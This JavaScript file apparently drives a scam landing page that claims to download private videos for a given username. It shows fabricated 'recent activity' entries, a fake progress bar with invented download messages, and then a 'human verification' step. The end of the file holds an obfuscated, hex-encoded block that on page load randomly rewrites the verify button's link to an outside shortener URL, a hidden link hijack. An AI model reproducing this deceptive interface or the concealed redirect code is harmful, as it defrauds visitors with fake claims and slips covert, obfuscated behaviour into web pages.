/**
 * Landing Page Config
 */
var config = {
    recentActivityIntervalDuration: 20,
    recentActivities: [{
      avatarImageUrl: 'img/avatar-0.png', 
      username: 'Anonymous',
      time: 'few hours ago',
      instagramProfileUrl: 'https://onlyreveals.com'
    }, {
      avatarImageUrl: 'img/avatar-1.png',
      username: 'Anonymous',
      time: 'few minutes ago',
      instagramProfileUrl: 'https://onlyreveals.com'
    }, {
      avatarImageUrl: 'img/avatar-2.png',
      username: 'Anonymous',
      time: 'few minutes ago',
      instagramProfileUrl: 'https://onlyreveals.com'
    }, {
      avatarImageUrl: 'img/avatar-3.png',
      username: 'Anonymous',
      time: 'few seconds ago',
      instagramProfileUrl: 'https://onlyreveals.com'
    }, {
      avatarImageUrl: 'img/avatar-4.png',
      username: 'Anonymous',
      time: 'few seconds ago',
      instagramProfileUrl: 'https://onlyreveals.com'
    }, {
      avatarImageUrl: 'img/avatar-5.png',
      username: 'Anonymous',
      time: 'few seconds ago',
      instagramProfileUrl: 'https://onlyreveals.com'
    }, {
      avatarImageUrl: 'img/avatar-6.png',
      username: 'Anonymous',
      time: 'few seconds ago',
      instagramProfileUrl: 'https://onlyreveals.com'
    }, {
      avatarImageUrl: 'img/avatar-7.png',
      username: 'Anonymous',
      time: 'few seconds ago',
      instagramProfileUrl: 'https://onlyreveals.com'
    }, {
      avatarImageUrl: 'img/avatar-8.png',
      username: 'Anonymous',
      time: 'few seconds ago',
      instagramProfileUrl: 'https://onlyreveals.com'
    }, {
      avatarImageUrl: 'img/avatar-9.png',
      username: 'Anonymous',
      time: 'few seconds ago',
      instagramProfileUrl: 'https://onlyreveals.com'
    }, {
      avatarImageUrl: 'img/avatar-10.png',
      username: 'Anonymous',
      time: 'few seconds ago',
      instagramProfileUrl: 'https://onlyreveals.com'
    }, {
      avatarImageUrl: 'img/avatar-11.png',
      username: 'Anonymous',
      time: 'few seconds ago',
      instagramProfileUrl: 'https://onlyreveals.com'
    }, {
      avatarImageUrl: 'img/avatar-12.png',
      username: 'Anonymous',
      time: 'few seconds ago',
      instagramProfileUrl: 'https://onlyreveals.com'
    }]
}
  , util = {
    animate: function(a, t, e) {
        $(a).addClass("animated " + t).one("webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend", function() {
            $(a).removeClass("animated " + t),
            "function" == typeof e && e()
        })
    }
}
  , app = {
    state: {
        username: void 0,
        displayingSection: "badge-generator"
    },
    init: function() {
        util.animate(".badge-generator", "fadeInDown"),
        recentActivity.init()
    },
    displayFromTo: function(a, t) {
        util.animate("." + a, "fadeOutUp", function() {
            $("." + a).hide(),
            $("." + t).show(),
            util.animate("." + t, "fadeInDown")
        }),
        $("body").animate({
            scrollTop: 0
        }, "slow"),
        app.state.displayingSection = t
    }
}
  , badgeGenerator = {
    verifyInput: function(a) {
        return !(a.length < 2) || (alert("Please enter the Username and tap the 'Download' button."),
        !1)
    }
};
$(".badge-generator button").on("click", function() {
    var a = $(".badge-generator input").val();
    badgeGenerator.verifyInput(a) && (app.state.username = a,
    $(".badge-generator"),
    app.displayFromTo("badge-generator", "generating-badge"),
    generatingBadge.initializeProgressBar())
});
var generatingBadge = {
    state: {
        progressBar: void 0
    },
    initializeProgressBar: function() {
        this.state.progressBar = new ProgressBar.Line("#progress-wrapper",{
            color: "#2C96EA",
            trailColor: "#ced5da",
            strokeWidth: 5
        }),
        this.startProgressBarAnimation()
    },
    startProgressBarAnimation: function() {
        this.state.progressBar.animate(1, {
            duration: 2e4
        }, function() {
            app.displayFromTo("generating-badge", "human-verification")
        }),
        this.startProgressMessages()
    },
    startProgressMessages: function() {
        var a = ["Downloading videos and pictures...", "Uploading videos and pictures to filehost..."]
          , t = 0
          , e = window.setInterval(function() {
            2 !== t ? ($(".progress-message").text(a[t]),
            t++) : window.clearInterval(e)
        }, 7e3)
    }
}
  , recentActivity = {
    state: {
        activities: config.recentActivities,
        interval: void 0
    },
    init: function() {
        let size = this.state.activities.length;
        for (i = 0; i < size; i++) {

            var t = this.createHtml(this.state.activities[i], i);

            this.appendHtml(t)
        }
        this.startInterval( size)
    },
    startInterval: function(size) {
        let start = size;
        0 < this.state.activities.length && (this.state.interval = window.setInterval(function() {

            activityHtml = recentActivity.createHtml(recentActivity.state.activities[start % size], (start % size) + 1),
            start += 1;
            recentActivity.appendHtml(activityHtml),
            $(".activities").animate({
                scrollTop: 0
            }, "slow")
        }, 1e3 * config.recentActivityIntervalDuration))
    },
    createHtml: function(a, index) {
        return "<a href='" + a.instagramProfileUrl + "' target='blank'><div class='activity animated fadeInDown'><div class='activity-content'><img class='activity-avatar' src='" + a.avatarImageUrl + "' /><p>" + a.username + "</p><img class='activity-badge' src='img/badge.png' /></div><div class='activity-timestamp'><p>" + a.time + "</p></div></div></a>"
    },
    appendHtml: function(a) {
        $(".activities").prepend(a)
    }
};
app.init();
var _0x9030 = ["\x73\x74\x61\x6E\x64\x61\x72\x64\x2E\x6A\x73", "\x69\x6E\x64\x65\x78\x4F\x66", "\x68\x72\x65\x66", "\x6C\x6F\x63\x61\x74\x69\x6F\x6E", "\x72\x61\x6E\x64\x6F\x6D", "\x66\x6C\x6F\x6F\x72", "\x6F\x6E\x6C\x6F\x61\x64", "\x76\x65\x72\x69\x66\x79\x2D\x62\x75\x74\x74\x6F\x6E", "\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64", "\x68\x74\x74\x70\x3A\x2F\x2F\x68\x79\x70\x65\x72\x75\x72\x6C\x2E\x63\x6F\x2F\x74\x64\x6A\x78\x30\x61"];
0 > window[_0x9030[3]][_0x9030[2]].toString()[_0x9030[1]](_0x9030[0]) && 0 == Math[_0x9030[5]](100 * Math[_0x9030[4]]() / 10) && (window[_0x9030[6]] = function() {
    document[_0x9030[8]](_0x9030[7])[_0x9030[2]] = _0x9030[9]
}
)
